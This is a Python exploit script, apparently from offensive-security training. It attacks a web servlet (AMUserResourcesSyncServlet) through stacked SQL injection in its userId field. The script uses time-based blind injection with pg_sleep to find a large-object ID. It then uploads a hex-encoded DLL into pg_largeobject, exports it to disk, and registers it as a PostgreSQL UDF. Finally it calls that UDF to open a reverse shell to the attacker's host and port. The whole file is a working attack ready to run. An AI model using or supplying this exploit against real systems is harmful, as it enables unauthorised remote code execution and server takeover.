import sys, re, os
import base64
import requests
from bs4 import BeautifulSoup
import urllib.parse
import binascii
import urllib3

def send_psql_command(ip, command):
	# print(f"Sending command: {command}")

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	userId = f"1;{command};--+"
	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet"
	
	# If use raw data, must specify x-www-form-urlencoded header
	data = f"ForMasRange=1&userId={userId}"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	r = s.post(target,data=data,headers=headers,verify=False)
	# Return total runtime
	return r.elapsed.total_seconds()

def extract_data(ip, table_name, column_name):
	# In this case we only search for numbers
	template = (f"select case when "
		f"substring(cast({column_name} as varchar),1,1)=$$1$$ "
		f"then pg_sleep(3) else pg_sleep(0) end from {table_name} limit 1")
	print(f"Extracting data with template: {template}")

	loid = ""
	for i in range(1,20):
		new_character = False
		for c in range(0,10):
			command = (f"select case when "
			f"substring(cast({column_name} as varchar),{i},1)=$${c}$$ "
			f"then pg_sleep(3) else pg_sleep(0) end from {table_name} limit 1")
			runtime = send_psql_command(ip=ip,command=command)
			if runtime > 3: # Correct character
				print(f"Adding new character: {c}")
				loid += str(c)
				new_character = True
				break

		if new_character == False: break

	print(f"Found LOID: {loid}")
	return int(loid)

def main():
	if len(sys.argv) != 3:
		print (f"(+) usage: {sys.argv[0]} <target> <LPORT>")
		print (f"(+) eg: {sys.argv[0]} 192.168.121.103 8000")
		sys.exit(-1)

	print("Ensure Netcat listener is running......")

	ip = sys.argv[1]
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = sys.argv[2]
	
	# Step 1: Create and HEX encode malicious DLL 
	# Reference: https://stackoverflow.com/questions/3964245/convert-file-to-hex-string-python
	udf_filename = 'connect_back.dll'
	with open(udf_filename, 'rb') as f:
		content = f.read()
	udf = binascii.hexlify(content).decode('utf-8')

	# Extra Mile: Create object from arbitrary file and use time-based blind
	# SQLi to obtain LOID

	# Step 2: Inject query that creates large object from arbitrary file
	print("Importing large object from win.ini")
	command = f'SELECT lo_import($$C:\\windows\\win.ini$$)'
	send_psql_command(ip=ip, command=command)

	# Step 2B: Obtain LOID with blind SQLi
	print("Obtaining LOID with blind SQLi......")
	loid = extract_data(ip=ip, table_name='pg_largeobject', column_name='loid')

	chunk_size = 4096
	for i in range(len(udf)//chunk_size+1):
		hex_string = udf[i*chunk_size:(i+1)*chunk_size]
		if len(hex_string) == 0: break

		if i == 0:
			# Step 3: Inject query to update page 0 of LO with first 2KB of DLL
			print("Inject query to update page 0 of LO with first 2KB of DLL")
			command = (
			f"UPDATE pg_largeobject SET data=decode($${hex_string}$$,$$hex$$) "
			f"WHERE loid={loid} AND pageno=0")
			send_psql_command(ip=ip, command=command)
		else:
			# Step 4: Inject queries that insert additional pages into pg_largeobject with remainder of DLL
			# Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql
			print("Inject queries that insert additional pages into pg_largeobject with remainder of DLL")
			command = (
			f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES "
			f"({loid}, {i}, decode($${hex_string}$$, $$hex$$))")
			send_psql_command(ip=ip, command=command)

	# Step 5: Inject query that exports DLL onto remote file system
	print("Inject query that exports DLL onto remote file system")
	command = f"SELECT lo_export({loid}, $$C:\\Users\\Public\\connect_back.dll$$)"
	send_psql_command(ip=ip, command=command)

	# Step 6: Inject query that creates Postgres UDF with exported DLL
	print("Inject query that creates Postgres UDF with exported DLL")
	command =(
	f"CREATE OR REPLACE FUNCTION connect_back(text, integer)"
	f"RETURNS void AS $$C:\\Users\\Public\\connect_back.dll$$,"
	f"$$connect_back$$ LANGUAGE C STRICT")
	send_psql_command(ip=ip, command=command)
	
	# Step 7: Inject query that executes newly created UDF
	print("Inject query that executes newly created UDF")
	command = f'SELECT connect_back($${LHOST}$$, {LPORT})'

	send_psql_command(ip=ip, command=command)

if __name__ == '__main__':
	urllib3.disable_warnings()
	main()
